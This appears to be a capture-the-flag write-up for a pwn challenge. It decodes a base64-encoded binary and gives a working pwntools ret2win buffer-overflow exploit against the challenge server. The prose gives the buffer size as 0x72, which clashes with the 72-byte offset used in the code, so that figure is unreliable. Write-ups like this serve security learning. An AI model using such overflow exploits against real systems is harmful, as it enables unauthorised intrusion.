# spam

**Category**: pwn

**Points**: 200

kaafi easy

`nc 195.154.231.70 5428`

## Files

- [f](./f)

## Solution

the given file is a base64 encoded binary. the first step is to decode it.

```python
import base64

with open('f', 'rb') as f:
    base64_data = f.read()
    binary_data = base64.b64decode(base64_data)
    with open('chall', 'wb') as output_f:
        output_f.write(binary_data)
```

another simple ret2win exploit. the buffer is 0x72 bytes long, so we need to fill it up, then add the address of the win function.

```python
from pwn import *

binary = context.binary = ELF("./chall", checksec=False)
if args.REMOTE:
    p = remote("195.154.231.70", 5428)
else:
    p = process(binary.path)

payload = b"A" * 72 # offset found using gdb
payload += p64(binary.sym.unreeeeeeeeeeeeeeeeeeeeeeal)

p.sendlineafter(b"today: ", payload)
output = p.recvall().decode("latin-1")
log.success(output[output.find("unreal") :])
```
